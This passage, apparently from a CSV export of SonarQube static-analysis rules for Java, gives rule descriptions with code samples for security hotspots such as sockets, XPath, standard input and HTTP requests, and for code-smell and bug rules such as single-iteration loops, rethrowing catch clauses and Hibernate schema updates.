        XPathAPI.selectNodeIterator(contextNode, str); // Questionable
        XPathAPI.selectNodeIterator(contextNode, str, namespaceNode); // Questionable
        XPathAPI.selectNodeList(contextNode, str); // Questionable
        XPathAPI.selectNodeList(contextNode, str, namespaceNode); // Questionable
        XPathAPI.selectSingleNode(contextNode, str); // Questionable
        XPathAPI.selectSingleNode(contextNode, str, namespaceNode); // Questionable
    }
}
</pre>
<pre>
// === org.apache.commons.jxpath ===
import org.apache.commons.jxpath.JXPathContext;

abstract class A extends JXPathContext{
    A(JXPathContext compilationContext, Object contextBean) {
        super(compilationContext, contextBean);
    }


    void foo(JXPathContext context, String str, Object obj, Class&lt;?&gt; requiredType) {
        JXPathContext.compile(str); // Questionable
        this.compilePath(str); // Questionable
        context.createPath(str); // Questionable
        context.createPathAndSetValue(str, obj); // Questionable
        context.getPointer(str); // Questionable
        context.getValue(str); // Questionable
        context.getValue(str, requiredType); // Questionable
        context.iterate(str); // Questionable
        context.iteratePointers(str); // Questionable
        context.removeAll(str); // Questionable
        context.removePath(str); // Questionable
        context.selectNodes(str); // Questionable
        context.selectSingleNode(str); // Questionable
        context.setValue(str, obj); // Questionable
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",Executing XPath expressions is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1']",SECURITY_HOTSPOT
2018-11-12T11:11:26+0100,"<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785"">CVE-2011-178</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645"">CVE-2017-5645</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597"">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === java.net ===
import java.net.Socket;
import java.net.InetAddress;
import java.net.Proxy;
import java.net.ServerSocket;
import javax.net.SocketFactory;

class A {
    void foo(SocketFactory factory, String address, int port, InetAddress localAddr, int localPort, boolean stream,
            String host, Proxy proxy, int backlog, InetAddress bindAddr)
            throws Exception {
        new Socket(); // Questionable.
        new Socket(address, port); // Questionable.
        new Socket(address, port, localAddr, localPort); // Questionable.
        new Socket(host, port, stream); // Questionable.
        new Socket(proxy); // Questionable.
        new Socket(host, port); // Questionable.
        new Socket(host, port, stream); // Questionable.
        new Socket(host, port, localAddr, localPort); // Questionable.

        new ServerSocket(); // Questionable.
        new ServerSocket(port); // Questionable.
        new ServerSocket(port, backlog); // Questionable.
        new ServerSocket(port, backlog, bindAddr); // Questionable.

        factory.createSocket(); // Questionable
    }
}

abstract class mySocketFactory extends SocketFactory { // Questionable. Review how the sockets are created.
    // ...
}
</pre>
<pre>
// === java.nio.channels ===
import java.net.SocketAddress;
import java.nio.channels.AsynchronousChannelGroup;
import java.nio.channels.AsynchronousServerSocketChannel;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.SocketChannel;
import java.nio.channels.ServerSocketChannel;

class A {
    void foo(AsynchronousChannelGroup group, SocketAddress remote) throws Exception {
        AsynchronousServerSocketChannel.open(); // Questionable.
        AsynchronousServerSocketChannel.open(group); // Questionable.
        AsynchronousSocketChannel.open(); // Questionable.
        AsynchronousSocketChannel.open(group); // Questionable.
        SocketChannel.open(); // Questionable.
        SocketChannel.open(remote); // Questionable.
        ServerSocketChannel.open(); // Questionable.
    }
}
</pre>
<pre>
// === Netty ===
import io.netty.channel.ChannelInitializer;
import io.netty.channel.socket.ServerSocketChannel;
import io.netty.channel.socket.SocketChannel;

class CustomChannelInitializer extends ChannelInitializer&lt;ServerSocketChannel&gt; { // Questionable. Review how the SocketChannel is used.
    @Override
    protected void initChannel(ServerSocketChannel ch) throws Exception {
    }
}

class A {
    void foo() {
        new ChannelInitializer&lt;SocketChannel&gt;() {  // Questionable
            @Override
            public void initChannel(SocketChannel ch) throws Exception {
                // ...
            }
        };
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/200"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",squid:S4818,java,Java,"<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785"">CVE-2011-178</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645"">CVE-2017-5645</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597"">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === java.net ===
import java.net.Socket;
import java.net.InetAddress;
import java.net.Proxy;
import java.net.ServerSocket;
import javax.net.SocketFactory;

class A {
    void foo(SocketFactory factory, String address, int port, InetAddress localAddr, int localPort, boolean stream,
            String host, Proxy proxy, int backlog, InetAddress bindAddr)
            throws Exception {
        new Socket(); // Questionable.
        new Socket(address, port); // Questionable.
        new Socket(address, port, localAddr, localPort); // Questionable.
        new Socket(host, port, stream); // Questionable.
        new Socket(proxy); // Questionable.
        new Socket(host, port); // Questionable.
        new Socket(host, port, stream); // Questionable.
        new Socket(host, port, localAddr, localPort); // Questionable.

        new ServerSocket(); // Questionable.
        new ServerSocket(port); // Questionable.
        new ServerSocket(port, backlog); // Questionable.
        new ServerSocket(port, backlog, bindAddr); // Questionable.

        factory.createSocket(); // Questionable
    }
}

abstract class mySocketFactory extends SocketFactory { // Questionable. Review how the sockets are created.
    // ...
}
</pre>
<pre>
// === java.nio.channels ===
import java.net.SocketAddress;
import java.nio.channels.AsynchronousChannelGroup;
import java.nio.channels.AsynchronousServerSocketChannel;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.SocketChannel;
import java.nio.channels.ServerSocketChannel;

class A {
    void foo(AsynchronousChannelGroup group, SocketAddress remote) throws Exception {
        AsynchronousServerSocketChannel.open(); // Questionable.
        AsynchronousServerSocketChannel.open(group); // Questionable.
        AsynchronousSocketChannel.open(); // Questionable.
        AsynchronousSocketChannel.open(group); // Questionable.
        SocketChannel.open(); // Questionable.
        SocketChannel.open(remote); // Questionable.
        ServerSocketChannel.open(); // Questionable.
    }
}
</pre>
<pre>
// === Netty ===
import io.netty.channel.ChannelInitializer;
import io.netty.channel.socket.ServerSocketChannel;
import io.netty.channel.socket.SocketChannel;

class CustomChannelInitializer extends ChannelInitializer&lt;ServerSocketChannel&gt; { // Questionable. Review how the SocketChannel is used.
    @Override
    protected void initChannel(ServerSocketChannel ch) throws Exception {
    }
}

class A {
    void foo() {
        new ChannelInitializer&lt;SocketChannel&gt;() {  // Questionable
            @Override
            public void initChannel(SocketChannel ch) throws Exception {
                // ...
            }
        };
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/200"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Using Sockets is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous', 'sans-top25-risky']",SECURITY_HOTSPOT
2017-05-05T12:32:52+0200,"<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  printf(""i is %d"", i);
  break;
}
...
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  if(i == x) {
    break;
  } else {
    printf(""i is %d"", i);
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  printf(""i is %d"", i);
}
...
for (int i = 0; i &lt; 10; i++) {
  if(i == x) {
    break;
  } else {
    printf(""i is %d"", i);
  }
}
</pre>",squid:S1751,java,Java,"<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  printf(""i is %d"", i);
  break;
}
...
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  if(i == x) {
    break;
  } else {
    printf(""i is %d"", i);
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  printf(""i is %d"", i);
}
...
for (int i = 0; i &lt; 10; i++) {
  if(i == x) {
    break;
  } else {
    printf(""i is %d"", i);
  }
}
</pre>",Loops with at most one iteration should be refactored,[],MAJOR,[],BUG
2016-01-19T14:20:54+0100,"<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String readFile(File f) {
  StringBuilder sb = new StringBuilder();
  try {
    FileReader fileReader = new FileReader(fileName);
    BufferedReader bufferedReader = new BufferedReader(fileReader);

    while((line = bufferedReader.readLine()) != null) {
      //...
  }
  catch (IOException e) {  // Noncompliant
    throw e;
  }
  return sb.toString();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String readFile(File f) {
  StringBuilder sb = new StringBuilder();
  try {
    FileReader fileReader = new FileReader(fileName);
    BufferedReader bufferedReader = new BufferedReader(fileReader);

    while((line = bufferedReader.readLine()) != null) {
      //...
  }
  catch (IOException e) {
    logger.LogError(e);
    throw e;
  }
  return sb.toString();
}
</pre>
<p>or</p>
<pre>
public String readFile(File f) throws IOException {
  StringBuilder sb = new StringBuilder();
  FileReader fileReader = new FileReader(fileName);
  BufferedReader bufferedReader = new BufferedReader(fileReader);

  while((line = bufferedReader.readLine()) != null) {
    //...

  return sb.toString();
}
</pre>",squid:S2737,java,Java,"<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String readFile(File f) {
  StringBuilder sb = new StringBuilder();
  try {
    FileReader fileReader = new FileReader(fileName);
    BufferedReader bufferedReader = new BufferedReader(fileReader);

    while((line = bufferedReader.readLine()) != null) {
      //...
  }
  catch (IOException e) {  // Noncompliant
    throw e;
  }
  return sb.toString();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String readFile(File f) {
  StringBuilder sb = new StringBuilder();
  try {
    FileReader fileReader = new FileReader(fileName);
    BufferedReader bufferedReader = new BufferedReader(fileReader);

    while((line = bufferedReader.readLine()) != null) {
      //...
  }
  catch (IOException e) {
    logger.LogError(e);
    throw e;
  }
  return sb.toString();
}
</pre>
<p>or</p>
<pre>
public String readFile(File f) throws IOException {
  StringBuilder sb = new StringBuilder();
  FileReader fileReader = new FileReader(fileName);
  BufferedReader bufferedReader = new BufferedReader(fileReader);

  while((line = bufferedReader.readLine()) != null) {
    //...

  return sb.toString();
}
</pre>","""catch"" clauses should do more than rethrow",[],MINOR,"['clumsy', 'error-handling', 'finding', 'unused']",CODE_SMELL
2018-11-12T11:11:26+0100,"<p>The use of any value but <code>""validate""</code> for <code>hibernate.hbm2ddl.auto</code> may cause the database schema used by your application to
be changed, dropped, or cleaned of all data. In short, the use of this property is risky, and should only be used in production with the
<code>""validate""</code> option, if it is used at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;session-factory&gt;
  &lt;property name=""hibernate.hbm2ddl.auto""&gt;update&lt;/property&gt;  &lt;!-- Noncompliant --&gt;
&lt;/session-factory&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;session-factory&gt;
  &lt;property name=""hibernate.hbm2ddl.auto""&gt;validate&lt;/property&gt;  &lt;!-- Compliant --&gt;
&lt;/session-factory&gt;
</pre>
<p>or</p>
<pre>
&lt;session-factory&gt;
  &lt;!-- Property deleted --&gt;
&lt;/session-factory&gt;
</pre>",squid:S3822,java,Java,"<p>The use of any value but <code>""validate""</code> for <code>hibernate.hbm2ddl.auto</code> may cause the database schema used by your application to
be changed, dropped, or cleaned of all data. In short, the use of this property is risky, and should only be used in production with the
<code>""validate""</code> option, if it is used at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;session-factory&gt;
  &lt;property name=""hibernate.hbm2ddl.auto""&gt;update&lt;/property&gt;  &lt;!-- Noncompliant --&gt;
&lt;/session-factory&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;session-factory&gt;
  &lt;property name=""hibernate.hbm2ddl.auto""&gt;validate&lt;/property&gt;  &lt;!-- Compliant --&gt;
&lt;/session-factory&gt;
</pre>
<p>or</p>
<pre>
&lt;session-factory&gt;
  &lt;!-- Property deleted --&gt;
&lt;/session-factory&gt;
</pre>",Hibernate should not update database schemas,[],CRITICAL,"['hibernate', 'sql']",BUG
2014-08-22T09:22:55+0200,"<p>A <code>NullPointerException</code> should indicate that a <code>null</code> value was unexpectedly encountered. Good programming practice dictates
that code is structured to avoid NPE's. </p>
<p>Explicitly throwing <code>NullPointerException</code> forces a method's callers to explicitly catch it, rather than coding to avoid it. Further, it
makes it difficult to distinguish between the unexpectedly-encountered <code>null</code> value and the condition which causes the method to purposely
throw an NPE.</p>
<p>If an NPE is being thrown to indicate that a parameter to the method should not have been null, use the <code>@NotNull</code> annotation
instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething (String aString) throws NullPointerException {
     throw new NullPointerException();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething (@NotNull String aString) {
}
</pre>",squid:S1695,java,Java,"<p>A <code>NullPointerException</code> should indicate that a <code>null</code> value was unexpectedly encountered. Good programming practice dictates
that code is structured to avoid NPE's. </p>
<p>Explicitly throwing <code>NullPointerException</code> forces a method's callers to explicitly catch it, rather than coding to avoid it. Further, it
makes it difficult to distinguish between the unexpectedly-encountered <code>null</code> value and the condition which causes the method to purposely
throw an NPE.</p>
<p>If an NPE is being thrown to indicate that a parameter to the method should not have been null, use the <code>@NotNull</code> annotation
instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething (String aString) throws NullPointerException {
     throw new NullPointerException();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething (@NotNull String aString) {
}
</pre>","""NullPointerException"" should not be explicitly thrown",[],MAJOR,"['error-handling', 'pitfall']",CODE_SMELL
2018-11-12T11:11:26+0100,"<p>Some Guava features were really useful for Java 7 application because Guava was bringing APIs missing in the JDK. Java 8 fixed these limitations.
When migrating an application to Java 8 or even when starting a new one, it's recommended to prefer Java 8 APIs over Guava ones to ease its
maintenance: developers don't need to learn how to use two APIs and can stick to the standard one.</p>
<p>This rule raises an issue when the following Guava APIs are used:</p>
<table>
  <tbody>
    <tr>
      <th> Guava API </th>
      <th> Java 8 API </th>
    </tr>
    <tr>
      <td> com.google.common.io.BaseEncoding#base64() </td>
      <td> java.util.Base64 </td>
    </tr>
    <tr>
      <td> com.google.common.io.BaseEncoding#base64Url() </td>
      <td> java.util.Base64 </td>
    </tr>
    <tr>
      <td> com.google.common.base.Joiner.on() </td>
      <td> java.lang.String#join() or java.util.stream.Collectors#joining() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional#of() </td>
      <td> java.util.Optional#of() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional#absent() </td>
      <td> java.util.Optional#empty() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional#fromNullable() </td>
      <td> java.util.Optional#ofNullable() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional </td>
      <td> java.util.Optional </td>
    </tr>
    <tr>
      <td> com.google.common.base.Predicate </td>
      <td> java.util.function.Predicate </td>
    </tr>
    <tr>
      <td> com.google.common.base.Function </td>
      <td> java.util.function.Function </td>
    </tr>
    <tr>
      <td> com.google.common.base.Supplier </td>
      <td> java.util.function.Supplier </td>
    </tr>
  </tbody>
</table>",squid:S4738,java,Java,"<p>Some Guava features were really useful for Java 7 application because Guava was bringing APIs missing in the JDK. Java 8 fixed these limitations.
When migrating an application to Java 8 or even when starting a new one, it's recommended to prefer Java 8 APIs over Guava ones to ease its
maintenance: developers don't need to learn how to use two APIs and can stick to the standard one.</p>
<p>This rule raises an issue when the following Guava APIs are used:</p>
<table>
  <tbody>
    <tr>
      <th> Guava API </th>
      <th> Java 8 API </th>
    </tr>
    <tr>
      <td> com.google.common.io.BaseEncoding#base64() </td>
      <td> java.util.Base64 </td>
    </tr>
    <tr>
      <td> com.google.common.io.BaseEncoding#base64Url() </td>
      <td> java.util.Base64 </td>
    </tr>
    <tr>
      <td> com.google.common.base.Joiner.on() </td>
      <td> java.lang.String#join() or java.util.stream.Collectors#joining() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional#of() </td>
      <td> java.util.Optional#of() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional#absent() </td>
      <td> java.util.Optional#empty() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional#fromNullable() </td>
      <td> java.util.Optional#ofNullable() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional </td>
      <td> java.util.Optional </td>
    </tr>
    <tr>
      <td> com.google.common.base.Predicate </td>
      <td> java.util.function.Predicate </td>
    </tr>
    <tr>
      <td> com.google.common.base.Function </td>
      <td> java.util.function.Function </td>
    </tr>
    <tr>
      <td> com.google.common.base.Supplier </td>
      <td> java.util.function.Supplier </td>
    </tr>
  </tbody>
</table>",Java 8 features should be preferred to Guava,[],MAJOR,"['guava', 'java8']",CODE_SMELL
2018-11-12T11:11:26+0100,"<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337"">CVE-2005-2337</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449"">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Questionable Code Example</h2>
<pre>
class A {
    void foo(String fmt, Object args) throws Exception {
        // Questionable. Check how the standard input is used.
        System.in.read();

        // Questionable. Check how safe this new InputStream is.
        System.setIn(new java.io.FileInputStream(""test.txt""));

        java.io.Console console = System.console();
        // Questionable. All the following calls should be reviewed as they use the standard input.
        console.reader();
        console.readLine();
        console.readLine(fmt, args);
        console.readPassword();
        console.readPassword(fmt, args);
    }
}
</pre>
<h2>Exceptions</h2>
<p>All references to <code>System.in</code> will create issues except direct calls to <code>System.in.close()</code>.</p>
<p>Command line parsing libraries such as JCommander often read standard input when asked for passwords. However this rule doesn't raise any issue in
this case as another hotspot rule covers command line arguments.</p>
<h2>See:</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>",squid:S4829,java,Java,"<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337"">CVE-2005-2337</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449"">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Questionable Code Example</h2>
<pre>
class A {
    void foo(String fmt, Object args) throws Exception {
        // Questionable. Check how the standard input is used.
        System.in.read();

        // Questionable. Check how safe this new InputStream is.
        System.setIn(new java.io.FileInputStream(""test.txt""));

        java.io.Console console = System.console();
        // Questionable. All the following calls should be reviewed as they use the standard input.
        console.reader();
        console.readLine();
        console.readLine(fmt, args);
        console.readPassword();
        console.readPassword(fmt, args);
    }
}
</pre>
<h2>Exceptions</h2>
<p>All references to <code>System.in</code> will create issues except direct calls to <code>System.in.close()</code>.</p>
<p>Command line parsing libraries such as JCommander often read standard input when asked for passwords. However this rule doesn't raise any issue in
this case as another hotspot rule covers command line arguments.</p>
<h2>See:</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>",Reading the Standard Input is security-sensitive,[],CRITICAL,['cwe'],SECURITY_HOTSPOT
2018-11-12T11:11:26+0100,"<p>Sending HTTP requests is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8150"">CVE-2014-8150</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000007"">CVE-2018-1000007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0660"">CVE-2010-0660</a> </li>
</ul>
<p>An HTTP request has different kinds of vulnerabilities:</p>
<ul>
  <li> it sends data which might be intercepted or dangerous. </li>
  <li> it receives a response which might have been crafted by an attacker. </li>
  <li> as each request opens a socket and triggers some processing for the sender and the recipient, it is possible to exhaust resources on both sides
  by sending too many requests. </li>
</ul>
<p>This rule flags code that initiates an HTTP request. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the http connection is encrypted or not. </li>
  <li> the recipient is not allowed to receive some of the data you send. </li>
  <li> the data sent might be dangerous (example: it contains unvalidated user input). </li>
  <li> an uncontrolled number of requests might be sent. For example, a request might be sent every time a user performs an action, and this action is
  not limited. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> First, it is important to encrypt all HTTP connection if there is any chance for them to be eavesdropped. Use HTTPS whenever possible. </li>
  <li> Ensure that you control the URIs you send requests to and the number or requests you send. Your software could otherwise be used to attack
  other services. </li>
  <li> Avoid sending sensitive information, be it in the URL, header or body. If part of the data comes from an untrusted source, such as a user
  input, sanitize it beforehand. </li>
  <li> Validate and sanitize the response before using it in any way. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === Java URL connection ===
import java.net.URL;
import java.net.HttpURLConnection;

abstract class URLConnection {
    void foo() throws Exception {
        URL url = new URL(""http://example.com"");
        HttpURLConnection con = (HttpURLConnection) url.openConnection(); // Questionable: review how the http connection is used

        doSomething((HttpURLConnection) url.openConnection()); // Questionable: review how the http connection is used
    }

    abstract void doSomething(HttpURLConnection httpUrlConnection);
}
</pre>
<pre>
// === HttpClient Java 9 ===
import jdk.incubator.http.HttpClient;
import jdk.incubator.http.HttpRequest;
import jdk.incubator.http.HttpResponse;

class JavaNet9 {
    void foo(HttpRequest request, HttpResponse.BodyHandler&lt;Object&gt; responseBodyHandler, HttpResponse.MultiProcessor&lt;?,?&gt; multiProcessor) throws Exception {
        HttpClient client = HttpClient.newHttpClient();
        client.send(request, responseBodyHandler); // Questionable
        client.sendAsync(request, responseBodyHandler); // Questionable
        client.sendAsync(request, multiProcessor); // Questionable
    }
}
</pre>
<pre>
// === HttpClient Java 10 ===
import jdk.incubator.http.HttpClient;
import jdk.incubator.http.HttpRequest;
import jdk.incubator.http.HttpResponse;

class JavaNet10 {
    void foo(HttpRequest request, HttpResponse.BodyHandler&lt;Object&gt; responseBodyHandler, HttpResponse.MultiSubscriber&lt;?,?&gt; multiSubscriber) throws Exception {
        HttpClient client = HttpClient.newHttpClient();
        client.send(request, responseBodyHandler); // Questionable
        client.sendAsync(request, responseBodyHandler); // Questionable
        client.sendAsync(request, multiSubscriber); // Questionable
    }
}
</pre>
<pre>
// === HttpClient Java 11 ===
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

class JavaNet11 {
    void foo(HttpRequest request, HttpResponse.BodyHandler&lt;Object&gt; responseBodyHandler, HttpResponse.PushPromiseHandler&lt;Object&gt; pushPromiseHandler) throws Exception {
        HttpClient client = HttpClient.newHttpClient();
        client.send(request, responseBodyHandler); // Questionable
        client.sendAsync(request, responseBodyHandler); // Questionable
        client.sendAsync(request, responseBodyHandler, pushPromiseHandler); // Questionable
    }
}
</pre>
<pre>
// === apache ===
import org.apache.http.client.HttpClient;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.HttpClientConnection;
import org.apache.http.HttpEntityEnclosingRequest;
import org.apache.http.HttpHost;
import org.apache.http.HttpRequest;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.protocol.HttpContext;

class ApacheHttpClient {
    void foo(HttpClientConnection con, HttpHost target, HttpRequest request, HttpContext context,
